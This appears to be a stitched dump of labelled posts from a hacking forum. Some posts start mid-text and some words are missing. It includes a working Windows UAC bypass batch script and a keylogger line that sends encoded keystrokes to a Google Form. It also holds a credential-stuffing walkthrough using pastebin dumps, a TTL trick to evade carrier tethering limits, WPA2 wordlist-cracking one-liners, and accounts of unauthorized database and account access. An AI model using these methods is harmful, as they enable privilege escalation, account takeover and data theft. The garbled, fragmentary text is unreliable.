**Update:** The investigator who handled my case called. Asked a bunch of questions. I explained her everything and all the precautions I've taken ever since. Right after the call ended, the money was transferred to my account. ",0

Long story short, I found a website with about 3000 company clients including one of my friends where using the same 4 digit password for likely 50% or more of the accounts. The website owner would give all new clients the same password to ""make it easier to get started"" but the only way to change the password was to e-mail the siteadmin, which you guessed it, very few people seems to have done.

To make it all worse the login name is an 8 digit number that is visible to anyone visiting the site (it is the goverment company ID). 

I tested 20-30 accounts manually and while there is a timerblock to avoid password bruteforcing there is no limit to the amount of account names you can look up and knowing the password I was able to access over half of them.

When I warned the company it took quite a while to get them to take this seriously and now I am left wondering how much leeway I should give them. Is this something they can fix in days or weeks and should I allow the hole to stay open?",0

1712,"Bypassing highest UAC level [Windows 8-10] **NOTE:** I have posted this before in here right after I discovered it, but it got a lot of attention and I was worried it would get patched or get flagged as malicious by AV's so I decided to delete it after like 2 hours, but I found another method, so I'm happy to share this one now.

&amp;#x200B;

It's done by adding temporary Environment variable **windir** into **HKCU\\Environment** registry path.

There's an auto-elevated task called **SilentCleanup** and it's located in: **%windir%\\system32\\cleanmgr.exe** We can easily abuse this and elevate any file with Administrator privileges without prompting UAC (even highest level).

So let's say I'm gonna set **windir** to: ""**cmd /k REM** ""

And forcefully run **SilentCleanup** task:

    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

**REM** will tell it to ignore everything after **%windir%** and treat it just as a NOTE. Therefore just executing cmd with admin privs.

If you want to try this for yourself, here's a little batch script I made to elevate powershell:

    @echo off
    mode 18,1
    color FE
    reg add ""HKCU\Environment"" /v ""windir"" /d ""cmd /c start powershell&amp;REM "" &gt;nul
    timeout /t 2 &gt;nul
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I &gt;nul
    timeout /t 3 &gt;nul
    reg delete ""HKCU\Environment"" /v ""windir"" /F

1755,"How I make money by   video games. (No, this isn't a spam post; I just thought some of you might be interested--especially you reverse engineers out there.) I thought about making this a 2600 article, but I figured it would have more reach here. My ultimate goal is to spark some inspiration in others and maybe help some people carve out a niche for themselves like I have.

As the title says, I make money   video games. No, it's not a full-time endeavor (but I'm working on making it so, which I'll cover in a bit), and no, I don't do anything even remotely close to something the skill or scope of [Glider](  or its ilk. 

Basically, if it involves   features that cost money (DLC, IAP, etc.) or involve online play, I don't touch it. That's where the biggest market is, but that's also where all the risk is.

First off, I primarily use an open source tool called Cheat Engine. It's branded as a game cheating tool, but it's really just a disassembler/debugger/memory scanner/scripting engine. It has a lot of very nifty features, but I won't belabor the point in this post.

What you do is start a game up, attach Cheat Engine, then search for values in memory to modify or look for instructions with which to create code injections. The end goal is, say, making a player level-up to max level instantly, or perhaps to have the game give the player 1000 gold for every 1 gold it would normally give. The options become limited only by your skill set as a game hacker.

This all began as a personal hobby, which eventually turned into a passion that ultimately gave me the foundation I needed to learn how a computer actually works (i.e., how a CPU communicates with RAM), as well as core fundamentals of programming. I still have a LOT to learn, but I smile where other programmers scoff at even the mention of Assembly. It's been a fascinating journey and I'm enamored with essentially being faced with new, complex puzzles at every turn.

So, with that in mind, and in combination with being entrepreneurial, I decided to start small by making YouTube videos that show others how to use Cheat Engine (CE from here on out). I could have written a huge book on everything lacking in then-current CE tutorials, and I wanted to use better analogies to take the confusing elements out of, say, understanding how multilevel pointers work.

I monetized those videos with AdSense (Google owns YouTube, for those who do not know, and Google has their own ad platform called AdSense that's free to use). Now, while the videos themselves haven't made me much money, the people I've attracted behind the scenes, have.

As a quick aside, there's an entire industry out there that revolves around   games, so it all depends on where at along that spectrum you want to fall (and, consequently, how much risk you care to venture). On the lowest end, you might run a blog where you rip-off other people's cheats or embed YouTube videos from others, then monetize your blog with ads. Moving up, you might run a forum that you monetize with ads or perhaps membership to get access to custom cheats and user-generated content. Continuing, you might make your own cheats/trainers and sell those (plenty of sites out there do this). On the highest end, you're risking your ass to make millions by doing something like Glider. ([Watch this presentation](  from DEFCON 19 sometime. You won't regret it--especially towards the end when they discuss the most ultimate Rick Roll in the history of Rick Rolls [start the video at 45:33 if you want to skip to it].)

Anyway, I ended up moving from just Cheat Engine videos to showing people how to do specific cheats in specific games. For instance, how to max level in The Witcher III, or how to give yourself infinite money in GTA 5 (single-player mode). Then, as my skill set has improved, I've started making videos showing people how to create some really customized and unique cheats, like making enemies die when they touch you in Terraria (just for example).

Once again, while not breaking the bank, it's the large numbers of people I'm driving that are resulting in other methods of monetization--namely, personal instruction and creating personalized videos. This is far and away the most I've ever been paid, but for what ultimately took 8 hours of my time, I made $750 from one person. That's WAY more than I've made from any other individual, but it was the first time in my life that I felt like I got paid for being a 1337 h4x0r, lol. I instantly thought of Neo in the White Rabbit scene from the first Matrix...but I'm not Neo. =(

So, where am I today? Well, I'm currently in the process of creating a course for my local community college to teach computing and programming fundamentals to beginners through   video games (and, yes, it's all on the up-and-up legally). The niche I've ultimately carved out for myself here is teaching beginners and helping people understand that they CAN grasp the basics of computing/programming and at least understand how things work in a completely different manner than typically approached in CS101.

I have a lot of plans moving forward and I would love this to become my livelihood. I still have a LOT to learn; programming has been my Achilles Heel for various reasons through the years, so I want to instill confidence and direction in others where it sorely lacked for me.

I won't become a bazillionaire doing this stuff, but I can honestly say it's one of the things I enjoy the most in my life. (Plus, the constant feeling of achievement through my own learning and growing of my skill set is wonderful, so I know exactly what my viewers/students feel when things *click*.)

There's a LOOOOOT more to all this that I didn't go over (such as strategies I've implemented, Internet marketing measures, investing in high-quality gear to make stellar videos, and the hours upon hours of time I've put into all of these efforts), but I hope the framework above serves to help and inspire someone out there who would like to turn their   skills into something lucrative!

1779,"Found a keylogger on my machine, now what? Hey,

(if it's not the right subreddit to post that, please tell me where I can post that)

So I discovered yesterday on my machine that I had a keylogger ""installed"". The malicious file was (as far as I could see) installed on May 25th.

I quickly removed it from its location to prevent further execution and checked a lot on my system. The key logger looks a lot like [this metasploit key logger](  and is logging everything on to a google form using something like:

    Net::HTTP.start('docs.google.com',:use_ssl=&gt;true){|connection|res=connection.post('/forms/d/e/&lt;form_id&gt;/formResponse',""entry.1017539216=#{Base64.urlsafe_encode64(s)}"")

This script was installed in `/usr/local/bin/env` and because this folder is used first in my `PATH`, it overrides the normal `/usr/bin/env` file.

I ran a search from `/` to look for the string `/usr/local/bin/env`.

I also found out that the file replaced the `org.mozilla.updater` file in `Applications/FirefoxDeveloperEdition.app/Contents/MacOS/updater.app/Contents/MacOS/` to call the malicious `env`.

I removed everything, checked my system for any trace of `/usr/local/bin/env` and I couldn't find anything anymore.

Nevertheless, I'm starting to backup my system, and I'll make a fresh install as soon as possible. I'm also planning to change all my passwords (luckily I use a password manager -1password-) and to ask my bank to send me another card.

My system is: OS X 10.10.5 (14F2315)

Two questions:

1. Is there anything else I can do before backuping to try to gather more information on how did this happen?
2. Since the content is saved into a google doc, I'd want to contact google so they can remove the doc. But it seems impossible, does anyone had experience with calling/talking to them and what's the best approach here?

Thanks!

1780,"TV and radio are   smart speakers I just noticed that my smart speaker had some apps that I did not download. When I checked the history of commands, I found that all the unauthorized downloads came from commands issued by a radio in the same room as the smart speaker. They came from advertisements which all start by saying ""To download \[app name\], just say \[smart speaker name\], download \[app name\].""

Do you think this is by design to boost app downloads?

It also makes me wonder about the possibility of using short range FM transmitter to issue commands to smart speakers sharing space with a radio. Thoughts?

&amp;#x200B;

update: This may be an exciting new attack vector for anybody interested in pentesting. From what I can see two schools of thought are developing around this theoretical vector. First approach, a command issued via FM frequency that would be disguised as white noise or a frequency that we simply cannot hear but the speaker can (think dog whistle). This attack could be used remotely, like from a radio station or even embedded in a song.

The second approach would be to broadcast a pirate signal that issues a command that people can hear by placing the attack FM transmitter between the radio and station(s) (like femtocell stingrays do to cellular phones) This attack could take place from outside a victims house that has a FM radio turned on and audible to the smart speaker.

update#2 : u/BeerJunky and u/frothface have pointed out that this kind of an attack could take place with something as primitive as a megaphone outside or simply being within earshot (social engineering).",0

I thought it was weird and hit some random keypresses and the computer responded to what I was doing but there were some inputs it did which I did not send as well. I noticed there was a web page up on amazon and newegg as well. The amazon webpage was open to a psn gift card page which sent a red flag to me since I know that's a hot item to social engineer online. When I went to this tab it closed itself automatically which made me think someone was in control still. 

I shut my computer down immediately and went onto my laptop and checked my amazon history and it showed that my account had purchased 2 psn gift cards. I talked to amazon and they canceled the orders (though I'm pretty sure the person got the codes since they send immediately iirc) and closed my account temporarily. 

Anyways I'm wondering what kind of attack was this? Did they find a way to remote desktop into my pc? I've read up a little on security (lackadaisically studying for my sec\+ right now) but have never heard of someone doing something like this. Is this common? What can I do to prevent it/ what did i do to warrant it?

1795,"Bypassing TMobile's tethering data cap/throttling with zero effort (not a post about VPN/proxy/ssh) [](/cadscience)I wasn't sure where I should post this; is this the right sub? This was simple enough I didn't think it warranted more of a writeup.

Background: I did a layman explanation of how TMobile differentiates tethering traffic [here]( 

The pwn: TMobile uses the time-to-live value of packets to determine if they have been routed through a phone or originate from the phone itself. To circumvent this, you want your tethered traffic to have the same TTL as phone traffic. The idea is to tether a device capable of overwriting TTL and set it to +1 over what you expect the phone's TTL to be, so that when it is routed by the phone and the TTL is decremented by 1 it is then the expected value.

Most phones have a TTL of 64. This means we need our tethered device's TTL to be 65, so that when it is decremented by passing through the phone it has the identical value of 64 and cannot be differentiated.

As a proof of concept, this will allow a linux machine to tether without being throttled or counting towards TMobile's tethering data cap:

    sudo iptables -t mangle -A POSTROUTING -j TTL --ttl-set 65

The advantages of this method are:      
* It applies to all data leaving the linux box. So you can tether via USB or bluetooth, and connect other devices through the box on ethernet or wifi like game consoles, smart TVs, more phones... the sky's the limit.   
* It does not modify the phone in any way. You could even use this on someone else's hotspot if you wanted to be nice and not eat their tethering allowance which is usually smaller than their cell data allowance.

EDIT: I just tried to set the post-routing TTL to 64 on the phone itself (rooted), but I don't have the necessary kernel module to modify TTL in an arbitrary manner. I'm almost certain this would not work on stock Marshmallow either. It's possible to install the correct kernel module on the device, but I CBA. It already does what I need it to.

**Access some random persons social media account right now:**

This method of account scraping relies on the fact that people reuse passwords and don't change them often, and also that random hackers post email/pass combos to pastebin on a daily basis.
Requirements:
Anaconda (Python)
 

ModLogin
 

Once you have anaconda installed (and added to path), you can download ModLogin to a folder on your desktop, create a python 2.7 environment:
 

pip install the necessary libraries in your environment (will tell you missing dependencies when you try to run modlogin each time):
 

and then grab a random email/pass list from pastebin daily dumps:
 

and run that text file of credentials through modlogin (must be in ""email:pass"" format specifically with a colon between, but cleaning that up in python is no problem (see:  

**And that's it**

I've done this numerous times, and each time I am stunned that it is easy as pie to gain access to facebook accounts, twitter, tumblr, okcupid, etc. While I have never tried to log in to any of these accounts (because I am 100% white hat obv), I find it a remarkably interesting experiment in the antics of our current post privacy age. Mind you - this is what an undergrad psych sophomore (me) can do in 10 minutes. Thinking about what the NSA is capable of is both terrifying and also very cool.

To combat this I would recommend you change your passwords often, and create use an algorithmically determined passphrase for each site. For instance, I use the first letters of something my grandfather told me when he passed away, followed by a combination of numbers and letters of personal significance, interspersed at key points with letters pertaining to the site I am logging into. It looks like random mumbo jumbo to anyone who saw it, but it's meaning is clear to me, and due to the nature of the chunking it is easy to remember (and changes for every site).

Or... just get a password manager.

Also - sim swapping is on the rise. It's a good idea to get a google voice number, and use that for all your two step verification. This could possibly save your house, car, or identity.

1813,"Discovered something highly illegal - Need advise! About a year ago i installed an app on my tablet that connects you to random strangers with an audio/video stream. I loved the concept and had some fun chatting arround. Because i'm really into programming and stuff i wanted to see how the app works. I decompiled the app and found out that even if the app claims that its anonymous it transmits a unique id to a server. At this point i didn't think much about it as it could've been used to ban people from the app. While digging further through the app i decided to do some packet inspection while running the app. I got connected to a stranger twice and recognized that the app received an id with each  connection that was established and it was the same for this stranger.
I don't want to go into details but from the decompiled app i created an modified app that lets me connect to the server with one little change in the code, it let me choose the id to connect to by myself. I didn't think it would work but it worked, i could enter an id from a stranger that i was connected to before and straight got his audio/video stream while he was using the app.

I thought ""wow thats a really insecure way to handle this"". From the decompiled code i knew the ip of the main server that was used for the app. I checked out the server and it seemed like it was a simple webserver running an sql database and a red5 rtmp server. Somehow i got access to the mysql database and was shocked. In the database there was a table with the unique IDs and device information but also a comment field that contained information like ""blonde, big boobs"" ""possible underage"" ""loves to flash"". (About 3000 entries with comments) and also a boolean field namend ""auto_record"" I discovered a table named recordings that was connected to the first table with about 50,000 entries. From the structure of the data in this table i came to the conclusion that users with the auto_record flag would automatically get their streams recorded. The entries had also comment (with similar content like above) and rating fields. (I guess the videos in flv format were directly asociated to a web application) I didn't have access to the files itself because they were stored on the filesystem to which i had no way to access them but it had to be a huge load of data.

So everybody who used this app was possibly watched by the person/group that created the app and also recorded. That's so super creepy and illegal that i deleted everything related to this and thought about going to the police. After sleeping a few nights i came to the conclusion to not go and tell them as i would have to explain why and how i've gained access. Anyhow the server was located in some eastern country so there would be only a small chance that anybody gets punished for this and also the app was deleted some days after i discovered what he/she/they did. But now there are like hundreds of these apps in the appstores and i think nobody should trust them.

What would be the best way to contact someone anonymously that has the knowledge to understand and prosecute this kind of thing?",0

1863,"How I Boosted My WPA2 Cracking Speed by &gt;300% using Hashcat Without any Hardware Upgrade Using the simple techniques used in this post you cans save your Hashcat/WPA2 cracking time/resources/bills exponentially.

&amp;#x200B;

# TL;DR

&amp;#x200B;

&gt;This complete topic can be summed up into the following one-liner

&amp;#x200B;

    cat wpa.txt | awk 'length &gt;=8 &amp;&amp; length &lt;=20' | uniq &gt; new-wordlist.txt
    

You can use this one-liner to save the time for cracking WPA2 Passphrases in your red-teaming operations or maybe just for fun   your neighbours and ignore rest of the post.

&amp;#x200B;

But, if you are interested in knowing the background details then keep reading...

&amp;#x200B;

The command above simply displays the content of a file named `wpa.txt` in the current working directory.

The output is then passed to `uniq` command to extract out duplicates (keep only unique values). Which is further passed to `awk` command which then limits the string (passphrase/word) length between 8 to 20 characters.

All the calculated passphrase thrown to STDOUT are then saved in a new file named `new-wordlist.txt`

&gt;Know that WiFi with WPA2-PSK encryption scheme has a password length ranging from a minimum of 8 characters to 63 characters.

&amp;#x200B;

The one-liner above uses 20 characters as upper limit because I think:

&amp;#x200B;

1. Nobody would keep a WiFi password that long
2. Even with string length longer than that, chances of cracking with wordlist are very thin.

You may change that according to your wish. Just keep the numbers within 8-63 and you are good to go.

&amp;#x200B;

\---------------------------------------------------------------------------------------------

One point of argument may arise here:

&amp;#x200B;

\- **I use Hashcat with my superfast cracking rig, it simply rejects the words that doesn't lie within the WPA2 range. Why would I care about optimising my wordlist?**

&amp;#x200B;

Well, data doesn't simply supports this argument. I performed few tests to see if it actually makes a difference for us in exhausting the complete wordlist with hashcat/non-optimised-wordlist and with hashcat/optimised-wordlist.

&amp;#x200B;

Here are my results:

&amp;#x200B;

**File name**: Words.txt

**Size**: 234 MB

**Optimised wordlist size**: 48 MB

&amp;#x200B;

***Time taken to exhaust whole wordlist***

**Words.txt**: `real 7m34.896s`

**new-wordlist.txt**: `real 2m2.207s`

&amp;#x200B;

&gt;For comparison, Watch the following video where I exhaust the rockyou.txt wordlist on ym MacBook Pro 2018 (16 GB RAM) with Radeon Pro 560 (4 GB Graphics Memory):

# [ 

&amp;#x200B;

That's a 3.3x of saved time. Even if time consumed to generate the new-wordlist.txt is considered, still we are more than 3.4x of saved time ahead of usual dictionary.

&amp;#x200B;

    time cat Words.txt | uniq | awk 'length &gt;=8 &amp;&amp; length &lt;=20' &gt; words
    real 0m6.161s
    user 0m10.713s
    sys 0m0.333s

From this we understand that the hashcat does reject the incorrect word length but maybe after actually trying operation. on it. 4096 iterations of SHA-256, maybe? I don't know.

But one thing is sure, if we craft our wordlist to length strictly within the acceptable range, we can reduce our cracking time by multiple folds.

&amp;#x200B;

Another question arises is that

&amp;#x200B;

\- **I have used 20 as the upper limits whereas the original file may contain more than 20 characters of passphrases that may've consumed time.**

&amp;#x200B;

I also did a test with optimised wordlist ranging from length 8 to 68.

&amp;#x200B;

**new-wordlist file size**: 53 MB

Total time to exhaust the wordlist by hashcat: `real 2m7.833s`

&amp;#x200B;

So, not a significant change there. We are still worlds apart from the original file's exhaustion time.

&amp;#x200B;

Moving on..

&amp;#x200B;

Till now we know that optimised wordlist is far better than just throwing away any random wordlist for your WPA2 cracking operations.

It only takes a few seconds to regenerate optimised wordlist out of a raw one. On my i7 MacBook pro it takes 6 seconds for every \~250 MB of text file.

\---------------------------------------------------------------------------------------------

&amp;#x200B;

# Reducing time to craft new-wordlist.txt

&amp;#x200B;

NOTE: The following section doesn't make a dent in your WPA2 cracking time, but if you catch the essence of it, your life will be much better in terms of efficiency and lesser production hassle will come to you as a reward by your own very nature.

&amp;#x200B;

You might have a wordlist in Gigabytes, maybe 10+ GBs. Or after reading this post you might want to bind all your existing wordlist (100+ GB maybe) into a single wpa-list.txt.

&amp;#x200B;

It will take some time to be optimised according to our method.

&amp;#x200B;

Knowing that the linux shell commands are single threaded process and we need more optimised methods to save more of our valuable time.

&amp;#x200B;

Using shell commands I know of 2 methods to get our job done.

&amp;#x200B;

1. Using awk command
2. Grep command

There are other ways as well, but I am leaving them upto you to explore and share back.

&amp;#x200B;

Let's take Words.txt for example. for 8 to 20 characters of range.

&amp;#x200B;

**Commands used:**

&amp;#x200B;

    time cat Words.txt | grep -xE '.{8,20}' | uniq &gt; wgu
    real 0m23.814s
    user 0m26.856s
    sys 0m0.720s

&amp;#x200B;

    time cat Words.txt | awk 'length &gt;=8 &amp;&amp; length &lt;=20' | uniq &gt; wordlist-awk
    real 0m18.207s
    user 0m21.419s
    sys 0m0.384s

&amp;#x200B;

using awk it takes **18 seconds** whereas using grep it takes **23 seconds**. The difference only increases with filesize.

Which makes it an obvious choice to use awk in our operations.

&amp;#x200B;

Although current filesize for Words.txt (raw wordlist) was \~250 MB. If we multiply it by 100 or say our raw wordlist size is 25 GB. it will take **2300 seconds for grep** and **1800 seconds for awk** to finish up the job.

&amp;#x200B;

an extra 8 minutes!

For approximately the same output.

&amp;#x200B;

# Optimised one-liner

&amp;#x200B;

By now you must be be in favour of using awk for your wordlist optimisation script. After all it is saving us some extra time.

&amp;#x200B;

What if I told you you can further reduce the time by 1/3rd by just rearranging our one-liner?

&amp;#x200B;

Ideally it doesn;t come to our mind to reorganise one-liners and see if makes any legitimate difference for us. But here we are. looking for further saving our resources, time, efforts, stress and most importantly building a coscious habit of working efficiently :)

&amp;#x200B;

In the beginning I gave the TL;DR command: 

    cat Words.txt | awk 'length &gt;=8 &amp;&amp; length &lt;=20' | uniq &gt; new-wordlist.txt

I saved the best advice for the most interested ones. Since you've made up to this point of this post I welcome you to see how you can further reduce the wordlist generation time by 3 folds.

&amp;#x200B;

One mandatory thing is this one-liner is to cat the file contents to STDOUT. That is the first and foremost thing to do, so no re-arrangement we can perform there.

Moving on, we perform operations on the output in 2 parts

&amp;#x200B;

1. Analyse complete file and remove duplicates.
2. Remove strings longer than 8 and less than 20 characters

By simply putting awk command after uniq, I was able to reduce the wordlist generation time by 3 folds. here are my results:

**Words.txt filesize**: \~250 MB

**resulting wordlist(s) size**: Exactly same, 48 MB

    time cat Words.txt | awk 'length &gt;=8 &amp;&amp; length &lt;=20' | uniq &gt; wau
    real 0m18.294s
    user 0m21.525s
    sys 0m0.389s

&amp;#x200B;

    time cat Words.txt | uniq | awk 'length &gt;=8 &amp;&amp; length &lt;=20' &gt; wua
    real 0m6.292s
    user 0m10.981s
    sys 0m0.380s

That's a 3x of more time when used uniq afterwards. Compare this with 25 GB of combined wordlist example.

&amp;#x200B;

Using `awk` before `uniq` would've taken **1800 seconds or 30 minutes**. whereas `uniq` before `awk` would've taken only **10 minutes**.

&amp;#x200B;

20 minutes worth of time, electricity saved just by simple rearrangement. Huge difference, right?

&amp;#x200B;

Note that we didn't use any GPU for this operation. Opencl/CUDA can make this process much much faster but that's not something I want to dive into at the moment.

&amp;#x200B;

Using the exact same CPU, exact same file with exact same output size. We achieved 300% of performance boost by simply rearranging our commands.

&amp;#x200B;

There are other ways to make this more efficient. I would like to have your views on it. Share your script with results.

&amp;#x200B;

While I'm on the beach I like to read a lot, so I'm looking for some books that will help me advance in Cyber Security. You should be able to learn something from the books purely by reading it, since I will not have access to a computer and the internet (not because there is no internet, but it's expensive and I like to stay away from it for those two weeks a year, it's really relaxing). Also the books shouldn't be too advanced since I'm a beginner in Cyber Security. Any books recommendations? Thanks!",0

My dad's a cyber security expert (a hacker pretty much), and he dedicates most of his time to his job. I've always been interested in that but I never actually tried getting into it because I was too busy with school and other occupations. I ordered this book:   about gray hat   fundamentals, but I'm not quite sure if that's really a good starting point. I'd like to start off with the basics, and I have all summer to learn so I don't mind something long, that would even better. To give you an idea of my level, the closest thing I've ever done to   or coding is learning the fundamentals of javascript, CSS, and HTML when I was bored so I don't know anything about  . Can anyone indicate me a good website or book that'd be a good starting point for me?",0

1975,"White Spaces can break everything I like whitespaces, they are chars that are there but you can't see, specially the zero width character, which is a whitespace that you really can't see. So, I discovered that you can play with it in Whatsapp.  By that I mean that you can freeze the cell phone of everyone for 2 or 5 seconds using discrete messages.

Another thing you can do:  

The logic is that there is too much chars and whatsapp hides it.

Well I posted it here since I've never seen anyone sending this type of messages. Whitespaces can actually break everything, I've never tested, but probably it works in reddit too.
